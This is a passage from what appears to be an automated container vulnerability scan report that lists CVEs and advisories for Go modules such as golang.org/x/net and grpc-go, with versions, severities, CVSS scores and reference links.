│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33123 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:33142 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:33150 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:34342 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [10]: https://access.redhat.com/security/cve/CVE-2026-33814 
│     │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2467815 
│     │      │                  ├ [12]: https://github.com/golang/go/issues/78476 
│     │      │                  ├ [13]: https://go-review.googlesource.com/c/go/+/761581 
│     │      │                  ├ [14]: https://go-review.googlesource.com/c/net/+/761640 
│     │      │                  ├ [15]: https://go.dev/cl/761581 
│     │      │                  ├ [16]: https://go.dev/cl/761640 
│     │      │                  ├ [17]: https://go.dev/issue/78476 
│     │      │                  ├ [18]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ├ [19]: https://linux.oracle.com/cve/CVE-2026-33814.html 
│     │      │                  ├ [20]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
│     │      │                  ├ [21]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
│     │      │                  ├ [22]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │      │                  ├ [23]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-33814
│     │      │                  │       .json 
│     │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8430-1 
│     │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8471-1 
│     │      │                  ├ [26]: https://ubuntu.com/security/notices/USN-8472-1 
│     │      │                  ├ [27]: https://ubuntu.com/security/notices/USN-8473-1 
│     │      │                  ╰ [28]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │      ╰ LastModifiedDate: 2026-07-24T13:18:01.21Z 
│     ├ [28] ╭ VulnerabilityID : CVE-2026-39821 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5026 
│     │      ├ PkgID           : golang.org/x/net@v0.48.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.48.0 
│     │      │                  ╰ UID : 6de028782d616b5e 
│     │      ├ InstalledVersion: v0.48.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39821 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:8351cd52fcf637dce742ee2b5279a91c2ec9caf0d848fd9ead3bd1415dd7a098 
│     │      ├ Title           : golang.org/x/net/idna: golang: net/http: golang.org/x/net/idna: Privilege
│     │      │                   escalation via incorrect Punycode label processing 
│     │      ├ Description     : The ToASCII and ToUnicode functions incorrectly accept Punycode-encoded labels
│     │      │                    that decode to an ASCII-only label. For example,
│     │      │                   ToUnicode("xn--example-.com") incorrectly returns the name "example.com"
│     │      │                   rather than an error. This behavior can lead to privilege escalation in
│     │      │                   programs using the idna package. For example, a program which performs
│     │      │                   privilege checks on the ASCII hostname may reject "example.com" but permit
│     │      │                   "xn--example-.com". If that program subsequently converts the ASCII hostname
│     │      │                   to Unicode, it will inadvertently permits access to the Unicode name
│     │      │                   "example.com". 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-1289 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 4 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ├ rocky      : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.2 
│     │      ├ References       ╭ [0]  : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1]  : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2]  : https://access.redhat.com/errata/RHSA-2026:26546 
│     │      │                  ├ [3]  : https://access.redhat.com/errata/RHSA-2026:26547 
│     │      │                  ├ [4]  : https://access.redhat.com/errata/RHSA-2026:30650 
│     │      │                  ├ [5]  : https://access.redhat.com/errata/RHSA-2026:30651 
│     │      │                  ├ [6]  : https://access.redhat.com/errata/RHSA-2026:30853 
│     │      │                  ├ [7]  : https://access.redhat.com/errata/RHSA-2026:30854 
│     │      │                  ├ [8]  : https://access.redhat.com/errata/RHSA-2026:30855 
│     │      │                  ├ [9]  : https://access.redhat.com/errata/RHSA-2026:33155 
│     │      │                  ├ [10] : https://access.redhat.com/errata/RHSA-2026:33160 
│     │      │                  ├ [11] : https://access.redhat.com/errata/RHSA-2026:33163 
│     │      │                  ├ [12] : https://access.redhat.com/errata/RHSA-2026:33173 
│     │      │                  ├ [13] : https://access.redhat.com/errata/RHSA-2026:33183 
│     │      │                  ├ [14] : https://access.redhat.com/errata/RHSA-2026:33524 
│     │      │                  ├ [15] : https://access.redhat.com/errata/RHSA-2026:33531 
│     │      │                  ├ [16] : https://access.redhat.com/errata/RHSA-2026:34342 
│     │      │                  ├ [17] : https://access.redhat.com/errata/RHSA-2026:34357 
│     │      │                  ├ [18] : https://access.redhat.com/errata/RHSA-2026:34359 
│     │      │                  ├ [19] : https://access.redhat.com/errata/RHSA-2026:34364 
│     │      │                  ├ [20] : https://access.redhat.com/errata/RHSA-2026:34789 
│     │      │                  ├ [21] : https://access.redhat.com/errata/RHSA-2026:35826 
│     │      │                  ├ [22] : https://access.redhat.com/errata/RHSA-2026:35827 
│     │      │                  ├ [23] : https://access.redhat.com/errata/RHSA-2026:35828 
│     │      │                  ├ [24] : https://access.redhat.com/errata/RHSA-2026:35829 
│     │      │                  ├ [25] : https://access.redhat.com/errata/RHSA-2026:35830 
│     │      │                  ├ [26] : https://access.redhat.com/errata/RHSA-2026:35831 
│     │      │                  ├ [27] : https://access.redhat.com/errata/RHSA-2026:35993 
│     │      │                  ├ [28] : https://access.redhat.com/errata/RHSA-2026:35994 
│     │      │                  ├ [29] : https://access.redhat.com/errata/RHSA-2026:36105 
│     │      │                  ├ [30] : https://access.redhat.com/errata/RHSA-2026:36167 
│     │      │                  ├ [31] : https://access.redhat.com/errata/RHSA-2026:36207 
│     │      │                  ├ [32] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [33] : https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [34] : https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [35] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [36] : https://access.redhat.com/errata/RHSA-2026:36808 
│     │      │                  ├ [37] : https://access.redhat.com/errata/RHSA-2026:36820 
│     │      │                  ├ [38] : https://access.redhat.com/errata/RHSA-2026:36883 
│     │      │                  ├ [39] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [40] : https://access.redhat.com/errata/RHSA-2026:37435 
│     │      │                  ├ [41] : https://access.redhat.com/errata/RHSA-2026:37436 
│     │      │                  ├ [42] : https://access.redhat.com/errata/RHSA-2026:38995 
│     │      │                  ├ [43] : https://access.redhat.com/errata/RHSA-2026:39005 
│     │      │                  ├ [44] : https://access.redhat.com/errata/RHSA-2026:39573 
│     │      │                  ├ [45] : https://access.redhat.com/errata/RHSA-2026:39879 
│     │      │                  ├ [46] : https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [47] : https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [48] : https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [49] : https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [50] : https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [51] : https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [52] : https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [53] : https://access.redhat.com/errata/RHSA-2026:41055 
│     │      │                  ├ [54] : https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [55] : https://access.redhat.com/errata/RHSA-2026:41928 
│     │      │                  ├ [56] : https://access.redhat.com/errata/RHSA-2026:41930 
│     │      │                  ├ [57] : https://access.redhat.com/errata/RHSA-2026:42043 
│     │      │                  ├ [58] : https://access.redhat.com/errata/RHSA-2026:42047 
│     │      │                  ├ [59] : https://access.redhat.com/errata/RHSA-2026:42048 
│     │      │                  ├ [60] : https://access.redhat.com/errata/RHSA-2026:42049 
│     │      │                  ├ [61] : https://access.redhat.com/errata/RHSA-2026:42050 
│     │      │                  ├ [62] : https://access.redhat.com/errata/RHSA-2026:42051 
│     │      │                  ├ [63] : https://access.redhat.com/errata/RHSA-2026:42078 
│     │      │                  ├ [64] : https://access.redhat.com/errata/RHSA-2026:42079 
│     │      │                  ├ [65] : https://access.redhat.com/errata/RHSA-2026:42080 
│     │      │                  ├ [66] : https://access.redhat.com/errata/RHSA-2026:42082 
│     │      │                  ├ [67] : https://access.redhat.com/errata/RHSA-2026:42132 
│     │      │                  ├ [68] : https://access.redhat.com/errata/RHSA-2026:42142 
│     │      │                  ├ [69] : https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [70] : https://access.redhat.com/errata/RHSA-2026:42150 
│     │      │                  ├ [71] : https://access.redhat.com/errata/RHSA-2026:42151 
│     │      │                  ├ [72] : https://access.redhat.com/errata/RHSA-2026:42240 
│     │      │                  ├ [73] : https://access.redhat.com/errata/RHSA-2026:42644 
│     │      │                  ├ [74] : https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [75] : https://access.redhat.com/errata/RHSA-2026:42852 
│     │      │                  ├ [76] : https://access.redhat.com/errata/RHSA-2026:43038 
│     │      │                  ├ [77] : https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [78] : https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [79] : https://access.redhat.com/errata/RHSA-2026:44622 
│     │      │                  ├ [80] : https://access.redhat.com/errata/RHSA-2026:44624 
│     │      │                  ├ [81] : https://access.redhat.com/errata/RHSA-2026:46395 
│     │      │                  ├ [82] : https://access.redhat.com/security/cve/CVE-2026-39821 
│     │      │                  ├ [83] : https://bugzilla.redhat.com/2480756 
│     │      │                  ├ [84] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
│     │      │                  ├ [85] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
│     │      │                  ├ [86] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
│     │      │                  ├ [87] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
│     │      │                  ├ [88] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
│     │      │                  ├ [89] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
│     │      │                  ├ [90] : https://errata.almalinux.org/9/ALSA-2026-37435.html 
│     │      │                  ├ [91] : https://errata.rockylinux.org/RLSA-2026:38995 
│     │      │                  ├ [92] : https://github.com/golang/go/issues/78760 
│     │      │                  ├ [93] : https://go.dev/cl/767220 
│     │      │                  ├ [94] : https://go.dev/issue/78760 
│     │      │                  ├ [95] : https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [96] : https://linux.oracle.com/cve/CVE-2026-39821.html 
│     │      │                  ├ [97] : https://linux.oracle.com/errata/ELSA-2026-39573.html 
│     │      │                  ├ [98] : https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
│     │      │                  ├ [99] : https://pkg.go.dev/vuln/GO-2026-5026 
│     │      │                  ├ [100]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3982
│     │      │                  │        1.json 
│     │      │                  ├ [101]: https://ubuntu.com/security/notices/USN-8416-1 
│     │      │                  ╰ [102]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:46.25Z 
│     ├ [29] ╭ VulnerabilityID : CVE-2026-25680 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5028 
│     │      ├ PkgID           : golang.org/x/net@v0.48.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.48.0 
│     │      │                  ╰ UID : 6de028782d616b5e 
│     │      ├ InstalledVersion: v0.48.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25680 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:628dddac9124a88837d88f71ecf28c974d7b259843d4c8778d717f8363bb425a 
│     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Denial of Service due to
│     │      │                   excessive HTML parsing 
│     │      ├ Description     : Parsing arbitrary HTML can consume excessive CPU time, possibly leading to
│     │      │                   denial of service. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-400 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-25680 
│     │      │                  ├ [1]: https://go.dev/cl/781702 
│     │      │                  ├ [2]: https://go.dev/issue/79573 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-25680 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5028 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-25680 
│     │      ├ PublishedDate   : 2026-05-22T16:16:19.753Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [30] ╭ VulnerabilityID : CVE-2026-42502 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5027 
│     │      ├ PkgID           : golang.org/x/net@v0.48.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.48.0 
│     │      │                  ╰ UID : 6de028782d616b5e 
│     │      ├ InstalledVersion: v0.48.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42502 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:45095fda216a24ab2ad35bf3cfd51cc7a803224ed7c8bf2efffcd299c4efb2dd 
│     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
│     │      │                    unexpected HTML tree rendering 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-1021 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                           ╰ V3Score : 6.1 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42502 
│     │      │                  ├ [1]: https://go.dev/cl/781701 
│     │      │                  ├ [2]: https://go.dev/issue/79572 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42502 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5027 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42502 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.587Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [31] ╭ VulnerabilityID : CVE-2026-42506 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5025 
│     │      ├ PkgID           : golang.org/x/net@v0.48.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.48.0 
│     │      │                  ╰ UID : 6de028782d616b5e 
│     │      ├ InstalledVersion: v0.48.0 
│     │      ├ FixedVersion    : 0.55.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42506 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:6df9d145f3bbeddda65e4d74e79ca006f10a400b44d30d12ccfab175db42bc01 
│     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Cross-Site Scripting (XSS) via
│     │      │                   arbitrary HTML parsing 
│     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
│     │      │                   unexpected HTML tree. This can be leveraged to execute XSS attacks in
│     │      │                   applications that attempt to sanitize input HTML before rendering. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ azure : 2 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                           ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42506 
│     │      │                  ├ [1]: https://go.dev/cl/781700 
│     │      │                  ├ [2]: https://go.dev/issue/79571 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42506 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5025 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42506 
│     │      ├ PublishedDate   : 2026-05-22T16:16:20.803Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [32] ╭ VulnerabilityID : CVE-2026-46600 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5942 
│     │      ├ PkgID           : golang.org/x/net@v0.48.0 
│     │      ├ PkgName         : golang.org/x/net 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.48.0 
│     │      │                  ╰ UID : 6de028782d616b5e 
│     │      ├ InstalledVersion: v0.48.0 
│     │      ├ FixedVersion    : 0.56.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:0f4b1ca84b2419204abd645e17248b9b410bdad8bccb6e99367a314c378e5502 
│     │      ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ... 
│     │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter
│     │      │                   value overflows the message buffer. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ CweIDs           ─ [0]: CWE-125 
│     │      ├ References       ╭ [0]: https://go.dev/cl/786345 
│     │      │                  ├ [1]: https://go.dev/issue/79795 
│     │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│     │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│     │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│     ├ [33] ╭ VulnerabilityID : CVE-2026-39824 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5024 
│     │      ├ PkgID           : golang.org/x/sys@v0.39.0 
│     │      ├ PkgName         : golang.org/x/sys 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/sys@v0.39.0 
│     │      │                  ╰ UID : 5a03751c8145c1ad 
│     │      ├ InstalledVersion: v0.39.0 
│     │      ├ FixedVersion    : 0.44.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39824 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:3d0f084b05561b01b7ba85ba13e0bfa9bd43a31ed07f7e07c797f4f56edc8e3b 
│     │      ├ Title           : Invoking integer overflow in NewNTUnicodeString in golang.org/x/sys/windows 
│     │      ├ Description     : NewNTUnicodeString does not check for string length overflow. When provided
│     │      │                   with a string that overflows the maximum size of a NTUnicodeString (a 16-bit
│     │      │                   number of bytes), it returns a truncated string rather than an error. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ CweIDs           ─ [0]: CWE-190 
│     │      ├ References       ╭ [0]: https://go.dev/cl/770080 
│     │      │                  ├ [1]: https://go.dev/issue/78916 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/6MMI8Lj-Atg 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5024 
│     │      ├ PublishedDate   : 2026-05-22T20:16:33.057Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [34] ╭ VulnerabilityID : CVE-2026-56852 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5970 
│     │      ├ PkgID           : golang.org/x/text@v0.32.0 
│     │      ├ PkgName         : golang.org/x/text 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.32.0 
│     │      │                  ╰ UID : bedde8cdccbcd995 
│     │      ├ InstalledVersion: v0.32.0 
│     │      ├ FixedVersion    : 0.39.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:021fc87fdfb94e54d7b35d39b901c5f48ccd437bf0479d8f9fe96857de47c5a4 
│     │      ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
│     │      ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
│     │      │                   UTF-8 bytes. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ CweIDs           ─ [0]: CWE-835 
│     │      ├ References       ╭ [0]: https://go.dev/cl/794100 
│     │      │                  ├ [1]: https://go.dev/issue/80142 
│     │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
│     │      ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│     │      ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│     ├ [35] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│     │      ├ PkgID           : google.golang.org/grpc@v1.79.3 
│     │      ├ PkgName         : google.golang.org/grpc 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.79.3 
│     │      │                  ╰ UID : ddb02fe2f9592999 
│     │      ├ InstalledVersion: v1.79.3 
│     │      ├ FixedVersion    : 1.82.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:d446c42719619a10b33c1537215910dfec549be39c9c121f7905bda21aa142e0 
│     │      ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│     │      ├ Description     : Multiple security vulnerabilities have been identified and addressed in
│     │      │                   grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and
│     │      │                   the HTTP/2 transport server implementation (internal/transport). These
│     │      │                   vulnerabilities could result in:
│     │      │                   
│     │      │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC policies
│     │      │                   containing `Metadata` or `RequestedServerName` fields.
│     │      │                   - Denial of Service (High CPU Consumption) due to an HTTP/2 Rapid Reset
│     │      │                   mitigation bypass during client-initiated stream resets.
│     │      │                   - Denial of Service (Server Panic) when parsing crafted xDS RBAC policies
│     │      │                   containing `NOT` rules around unsupported fields.
│     │      │                   ### Impact
│     │      │                   _What kind of vulnerability is it? Who is impacted?_
│     │      │                   #### xDS RBAC Authorization Bypass via `Metadata` & `RequestedServerName`
│     │      │                   matchers
│     │      │                   - Affected Component: xDS RBAC 
│     │      │                   - Impact: When building policy matchers for gRPC RBAC from xDS configurations,
│     │      │                    unsupported `permission` and `principal` rules (specifically `Metadata` and
│     │      │                   `RequestedServerName`) were silently ignored and treated as no-ops.
│     │      │                     - If an authorization policy relied purely on these matchers for access
│     │      │                   control, treating those rules as no-ops effectively removed the restrictions.
│     │      │                   - If these unsupported rules were nested inside logical `NOT` rules
│     │      │                   (`Permission_NotRule` / `Principal_NotId`) or multi-condition `OR/AND` rules,
│     │      │                   silently dropping them changed the boolean logic flow of the authorization
│     │      │                   engine.
│     │      │                   As a result, policy evaluation decisions could fail open, allowing
│     │      │                   unauthorized clients to access protected gRPC services or resources.
│     │      │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service via Stream
│     │      │                   Aborts
│     │      │                   - Affected Component: HTTP/2 transport
│     │      │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid Reset only applied
│     │      │                   threshold checks to items that directly resulted in control frames being
│     │      │                   written back to the wire, such as `SETTINGS` ACKs or server-initiated
│     │      │                   `RST_STREAM`s.
│     │      │                   When a client initiated a rapid flood of stream creation (`HEADERS`)
│     │      │                   immediately followed by stream termination `RST_STREAM`, items queued up in
│     │      │                   the control buffer without counting against the transport response frame
│     │      │                   threshold. An attacker can repeatedly trigger this flood sequence to bypass
│     │      │                   reader blocking, resulting in high CPU usage, and Denial of Service (DoS).
│     │      │                   #### Denial of Service (Panic) in xDS RBAC Engine via Unsupported Fields
│     │      │                   inside NOT Rules
│     │      │                   - Impact: The xDS RBAC policy translators recursively generate matchers for
│     │      │                   nested rules. When a `NOT` rule wrapped an unsupported or unhandled field
│     │      │                   (such as `SourcedMetadata`), the recursive step returned an empty matcher.
